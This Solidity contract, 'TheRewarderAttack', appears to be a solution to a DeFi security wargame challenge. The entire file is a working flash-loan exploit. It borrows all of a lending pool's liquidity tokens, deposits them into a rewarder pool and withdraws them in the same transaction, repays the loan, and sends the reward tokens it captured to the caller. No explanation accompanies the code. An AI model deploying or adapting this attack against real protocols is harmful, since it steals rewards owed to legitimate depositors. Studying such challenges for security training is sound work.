// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function liquidityToken() external returns (address);

    function rewardToken() external returns (address);

    function deposit(uint256 amount) external;

    function withdraw(uint256 amount) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

contract TheRewarderAttack {
    IFlashLoanerPool flashLoanPool;
    ITheRewarderPool rewarderPool;
    IERC20 liquidityToken;
    IERC20 rewardToken;

    constructor(address _flashLoanPool, address _rewarderPool) {
        flashLoanPool = IFlashLoanerPool(_flashLoanPool);
        rewarderPool = ITheRewarderPool(_rewarderPool);
        liquidityToken = IERC20(rewarderPool.liquidityToken());
        rewardToken = IERC20(rewarderPool.rewardToken());
    }

    function exploit() external {
        flashLoanPool.flashLoan(
            liquidityToken.balanceOf(address(flashLoanPool))
        );
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);
    }
}
